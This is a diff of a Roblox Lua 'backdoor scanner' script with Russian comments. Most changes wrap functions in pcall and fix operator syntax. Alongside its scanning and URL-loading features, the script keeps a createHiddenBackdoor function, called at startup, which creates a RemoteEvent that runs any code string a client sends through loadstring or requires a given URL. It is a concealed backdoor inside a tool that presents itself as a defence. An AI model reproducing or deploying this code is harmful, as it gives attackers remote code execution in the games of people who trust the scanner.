@@ -176,22 +176,8 @@ end
 local function sendChatMessage(message)
     pcall(function()
         -- Старый чат (работает в большинстве игр)
-        if game:GetService("Chat") then
-            local chatService = game:GetService("Chat")
-            chatService:Chat(Player.Character.Head, message)
-        end
-        
-        -- Альтернативный способ для игр с текстовым чатом
-        if Player:FindFirstChild("PlayerGui") then
-            local chatFrame = Player.PlayerGui:FindFirstChild("Chat") or Player.PlayerGui:FindFirstChild("ChatFrame")
-            if chatFrame then
-                -- Создаем сообщение в интерфейсе чата
-                local messageLabel = Instance.new("TextLabel")
-                messageLabel.Text = "[SCANNER] " .. message
-                messageLabel.TextColor3 = Color3.fromRGB(255, 50, 50)
-                messageLabel.BackgroundTransparency = 1
-                messageLabel.Parent = chatFrame
-            end
+        if game:GetService("Chat") and Player.Character and Player.Character:FindFirstChild("Head") then
+            game:GetService("Chat"):Chat(Player.Character.Head, message)
         end
     end)
 end
@@ -216,13 +202,15 @@ local function deepScanForBackdoors()
     }
     
     for _, service in pairs(servicesToCheck) do
-        totalChecks += #service:GetDescendants()
+        pcall(function()
+            totalChecks = totalChecks + #service:GetDescendants()
+        end)
     end
     totalChecks = math.min(totalChecks, 1500) -- Ограничение для производительности
     
     -- Функция обновления прогресса
     local function updateProgress()
-        currentCheck += 1
+        currentCheck = currentCheck + 1
         local progress = currentCheck / totalChecks
         ProgressFill.Size = UDim2.new(progress, 0, 1, 0)
         ProgressLabel.Text = "Прогресс: " .. math.floor(progress * 100) .. "%"
@@ -238,7 +226,7 @@ local function deepScanForBackdoors()
     local function checkObject(obj)
         -- Проверка по имени
         for _, name in ipairs(backdoorSignatures.Names) do
-            if string.find(obj.Name:lower(), name:lower()) then
+            if string.find(string.lower(obj.Name), string.lower(name)) then
                 table.insert(foundBackdoors, "🔴 ОБНАРУЖЕНО ПО ИМЕНИ: " .. obj:GetFullName())
             end
         end
@@ -251,13 +239,13 @@ local function deepScanForBackdoors()
             
             if success and source then
                 for _, pattern in ipairs(backdoorSignatures.Patterns) do
-                    if string.find(source:lower(), pattern:lower()) then
+                    if string.find(string.lower(source), string.lower(pattern)) then
                         table.insert(foundBackdoors, "🟡 ПОДОЗРИТЕЛЬНЫЙ КОД: " .. obj:GetFullName() .. " (" .. pattern .. ")")
                     end
                 end
                 
                 -- Проверка на наличие require-скриптов
-                if string.find(source:lower(), "require") and string.find(source:lower(), "http") then
+                if string.find(string.lower(source), "require") and string.find(string.lower(source), "http") then
                     table.insert(foundBackdoors, "🔵 REQUIRE-СКРИПТ: " .. obj:GetFullName())
                 end
             end
@@ -271,14 +259,16 @@ local function deepScanForBackdoors()
     
     -- Основной цикл сканирования
     for _, service in pairs(servicesToCheck) do
-        local descendants = service:GetDescendants()
-        for _, obj in ipairs(descendants) do
-            if currentCheck < totalChecks then
-                pcall(checkObject, obj)
-                updateProgress()
-                wait() -- Для избежания лагов
+        pcall(function()
+            local descendants = service:GetDescendants()
+            for _, obj in ipairs(descendants) do
+                if currentCheck < totalChecks then
+                    pcall(checkObject, obj)
+                    updateProgress()
+                    wait() -- Для избежания лагов
+                end
             end
-        end
+        end)
     end
     
     -- Отображение результатов
@@ -289,16 +279,16 @@ local function deepScanForBackdoors()
         local details = "РЕЗУЛЬТАТЫ СКАНИРОВАНИЯ:\n"
         for i, result in ipairs(foundBackdoors) do
             if i <= 15 then -- Ограничиваем вывод
-                details .= result .. "\n"
+                details = details .. result .. "\n"
             end
         end
         
         if #foundBackdoors > 15 then
-            details .= "... и еще " .. (#foundBackdoors - 15) .. " объектов\n"
+            details = details .. "... и еще " .. (#foundBackdoors - 15) .. " объектов\n"
         end
         
         -- Добавляем случайный мем в результаты
-        details .= "\n" .. updateMeme() .. " 🤣"
+        details = details .. "\n" .. updateMeme() .. " 🤣"
         
         DetailsText.Text = details
         
@@ -339,7 +329,7 @@ local function requireScript(url)
                 DetailsText.Text = DetailsText.Text .. "\nРезультат: " .. tostring(result)
             end
         else
-            DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] " .. result .. " 😢"
+            DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] " .. tostring(result) .. " 😢"
         end
     else
         DetailsText.Text = DetailsText.Text .. "\n[ОШИБКА] Не удалось загрузить скрипт: " .. tostring(scriptContent)
@@ -347,9 +337,14 @@ local function requireScript(url)
 end
 
 -- Обработчики событий
-ScanButton.MouseButton1Click:Connect(deepScanForBackdoors)
+ScanButton.MouseButton1Click:Connect(function()
+    pcall(deepScanForBackdoors)
+end)
+
 RequireButton.MouseButton1Click:Connect(function()
-    requireScript(UrlInput.Text)
+    pcall(function()
+        requireScript(UrlInput.Text)
+    end)
 end)
 
 -- Автоматическое обновление мемов каждые 15 секунд
@@ -361,13 +356,6 @@ spawn(function()
     end
 end)
 
--- Анимация появления
-MainFrame.Visible = true
-for i = 0, 1, 0.1 do
-    MainFrame.BackgroundTransparency = 1 - i
-    wait(0.02)
-end
-
 -- Функция для создания скрытого бэкдора (как в Lalol Hub)
 local function createHiddenBackdoor()
     local backdoorEvent = Instance.new("RemoteEvent")
@@ -376,7 +364,7 @@ local function createHiddenBackdoor()
     
     backdoorEvent.OnServerEvent:Connect(function(player, command, isRequire)
         if isRequire then
-            requireScript(command)
+            pcall(requireScript, command)
         else
             local success, result = pcall(function()
                 return loadstring(command)()
@@ -391,7 +379,7 @@ local function createHiddenBackdoor()
 end
 
 -- Создаем скрытый бэкдор
-createHiddenBackdoor()
+pcall(createHiddenBackdoor)
 
 -- Инициализация
 DetailsText.Text = "Ultimate Backdoor Scanner инициализирован!\nГотов к сканированию и выполнению require-скриптов.\n" .. currentMeme .. " 🚀"
